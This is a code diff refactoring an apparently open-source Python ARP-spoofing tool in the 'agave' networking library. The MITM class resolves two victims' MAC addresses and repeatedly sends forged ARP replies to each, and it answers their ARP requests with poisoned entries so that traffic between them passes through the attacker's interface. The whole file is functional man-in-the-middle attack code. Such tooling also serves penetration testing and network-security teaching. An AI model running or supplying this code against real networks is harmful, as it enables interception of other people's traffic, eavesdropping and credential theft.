@@ -1,14 +1,11 @@
-from agave.frames import ethernet, arp
-from ipaddress import IPv4Address
-import select, socket, time
-from .utils import _create_socket, _parse, SOCKET_MAX_READ
-from .resolve import resolve
-from agave.modules.nic.interfaces import NetworkInterface
-from agave.frames.ethernet import MACAddress
+import time
 from typing import Tuple
-
-
-HOST = Tuple[MACAddress, IPv4Address]
+from agave.frames import ethernet, arp
+from agave.frames.ethernet import MACAddress
+from agave.modules.nic.interfaces import NetworkInterface
+from .utils import ARPReaderLoop, HOST
+from .resolve import resolve
+from ipaddress import IPv4Address
 
 
 def main(argv):
@@ -17,8 +14,10 @@ def main(argv):
 		alice_ip = IPv4Address(argv[1])
 		alice_mac = resolve(interface, alice_ip)
 		print("Resolved {} to {}".format(alice_ip, alice_mac))
+		assert alice_mac is not None
 		bob_ip = IPv4Address(argv[2])
 		bob_mac = resolve(interface, bob_ip)
+		assert bob_mac is not None
 		print("Resolved {} to {}".format(bob_ip, bob_mac))
 		print("Running ...")
 		MITM(
@@ -30,7 +29,7 @@ def main(argv):
 		pass
 
 
-class MITM:
+class MITM(ARPReaderLoop):
 
 	def __init__(
 		self,
@@ -39,7 +38,7 @@ class MITM:
 		bob: HOST,
 		flood_interval: float = 1
 	):
-		self.rawsocket = _create_socket()
+		super().__init__(selector_timeout=flood_interval)
 		self.message_for_bob = arp.ARP.is_at(
 			interface.mac.address, alice[1],
 			bob[0].address, bob[1]
@@ -55,30 +54,28 @@ class MITM:
 		self.alice_ip = alice[1].packed
 
 	def send_gratuitous(self):
-		self.rawsocket.sendto(self.message_for_bob, self.interface)
-		self.rawsocket.sendto(self.message_for_alice, self.interface)
+		self._sock.sendto(self.message_for_bob, self.interface)
+		self._sock.sendto(self.message_for_alice, self.interface)
 		self.last_gratuitous = time.time()
 
 	def should_send_gratuitous(self):
 		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)
 
-	def process(self, data: bytes):
-		eth_frame, arp_frame = _parse(data)
-		if arp_frame.operation == arp.OPERATION_REQUEST:
+	def process(self, address: Tuple, eth: ethernet.Ethernet, frame: arp.ARP):
+		if frame.operation == arp.OPERATION_REQUEST:
 			# if alice requests bob's mac
-			if (arp_frame.target_protocol_address == self.bob_ip and
-					arp_frame.sender_protocol_address == self.alice_ip):
-				self.rawsocket.sendto(self.message_for_alice, self.interface)
+			if (frame.target_protocol_address == self.bob_ip and
+					frame.sender_protocol_address == self.alice_ip):
+				self._sock.sendto(self.message_for_alice, self.interface)
 			# if bob requests alice's mac
-			elif (arp_frame.target_protocol_address == self.alice_ip and
-					arp_frame.sender_protocol_address == self.bob_ip):
-				self.rawsocket.sendto(self.message_for_bob, self.interface)
+			elif (frame.target_protocol_address == self.alice_ip and
+					frame.sender_protocol_address == self.bob_ip):
+				self._sock.sendto(self.message_for_bob, self.interface)
+
+	def after(self):
+		if self.should_send_gratuitous():
+			self.send_gratuitous()
 
 	def run(self):
 		self.send_gratuitous()
-		while True:
-			rl, wl, xl = select.select([self.rawsocket], [], [], self.gratuitous_timeout)
-			if rl != []:
-				self.process(self.rawsocket.recv(SOCKET_MAX_READ))
-			if self.should_send_gratuitous():
-				self.send_gratuitous()
+		super().run()
